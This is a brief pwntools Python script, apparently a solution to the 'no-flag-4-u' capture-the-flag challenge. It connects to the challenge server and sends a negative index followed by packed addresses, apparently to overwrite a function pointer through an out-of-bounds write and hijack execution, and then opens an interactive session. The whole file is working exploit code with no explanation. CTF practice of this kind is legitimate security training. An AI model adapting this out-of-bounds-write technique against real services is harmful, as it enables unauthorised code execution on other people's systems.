from pwn import *

#io = process('./chal', env={"LD_PRELOAD":"./libno_flag_4_u.so"})
io = remote('no-flag-4-u.ctf.maplebacon.org', 1337)

io.sendline(b'2')
io.sendline(b'-5')
io.sendline(p32(0x403510))
io.sendline(b'2')
io.sendline(b'0')
io.sendline(p32(0x401338))
io.interactive()
